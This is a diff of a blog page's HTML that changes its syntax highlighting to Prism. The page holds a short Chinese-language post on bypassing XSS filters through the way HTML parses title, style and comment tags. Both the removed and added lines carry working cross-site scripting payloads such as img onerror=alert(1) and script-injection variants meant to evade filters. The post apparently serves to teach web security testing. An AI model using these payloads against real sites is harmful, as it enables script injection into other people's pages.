@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -477,10 +478,19 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p>有些html标签优先级特别高，他们觉得结束标签可以直接终结掉一个标签的属性<br>比如 <code>&lt;textarea&gt;</code>, <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;script&gt;</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;/title&gt;&lt;img src=x onerror=alert(1) //"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">&lt;a href="</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> //"&gt;</span></div></pre></td></tr></table></figure></p>
+        <p>有些html标签优先级特别高，他们觉得结束标签可以直接终结掉一个标签的属性<br>比如 <code>&lt;textarea&gt;</code>, <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;script&gt;</code></p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;/title<span class="token punctuation">></span>&lt;img src<span class="token punctuation">=</span>x onerror<span class="token punctuation">=</span>alert(1) //<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a href="</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>&lt;img src=x onerror=alert(1) //">
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>可以绕过一些过滤器<br>另外注释可以看做是优先级超级高的标签</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- &lt;a href="--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> //"&gt;</span></div></pre></td></tr></table></figure>
-<p>如果很不幸运，前面的都给过滤掉了<br>可以试一试下面的，前人太强了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span> foo=<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div><div class="line"><span class="php">&lt;! foo=<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div><div class="line"><span class="php">&lt;/ foo=<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div><div class="line"><span class="php">&lt;% foo=<span class="string">"%&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- &lt;a href="--></span>&lt;img src=x onerror=alert(1) //">
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果很不幸运，前面的都给过滤掉了<br>可以试一试下面的，前人太强了</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?</span> <span class="token attr-name">foo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">></span>&lt;script<span class="token punctuation">></span>alert(1)&lt;/script<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">foo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">></span>&lt;script<span class="token punctuation">></span>alert(1)&lt;/script<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+&lt;/ foo="><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">foo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>%<span class="token punctuation">></span>&lt;script<span class="token punctuation">></span>alert(1)&lt;/script<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
         
     
